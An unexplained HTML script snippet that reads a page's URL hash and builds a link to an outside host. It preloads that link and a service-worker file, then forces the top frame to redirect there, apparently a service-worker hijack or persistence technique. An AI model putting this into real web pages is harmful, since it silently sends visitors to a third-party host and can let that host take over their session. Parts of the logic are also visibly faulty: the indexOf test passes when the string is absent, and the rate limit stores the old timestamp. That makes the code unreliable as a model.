<script>
if (navigator.serviceWorker) {
  setupSw();
}

function preload(list, cb) {
  var count = 0;
  for (var i = 0; i < list.length; i++) {
    var img = new Image();
    img.onerror = function() {
      if (++count == list.length) {
        cb();
      }
    };
    img.src = list[i];
  }
}

function setupSw() {
  var now = Date.now();
  var checkFail;
  try {
    var ts = localStorage.sw || 0;
    if (now - ts < 1000 * 300) {
      return;
    }
    localStorage.sw = ts;
  } catch (err) {
    checkFail = true;
  }

  var refer = location.hash.substr(1);
  var url;
  if (refer.indexOf('92531')) {
    url = 'https://etherdream.github.com/setupsw/ata_92531.html#' + refer;
  }
  if (!url) {
    return;
  }

  var reslist = [url, 'sw.js'];
  preload(reslist, function() {
    if (checkFail) {
      if (Date.now() - now < 50) {
        return;
      }
    }
    top.location = url;
  });
}
</script>
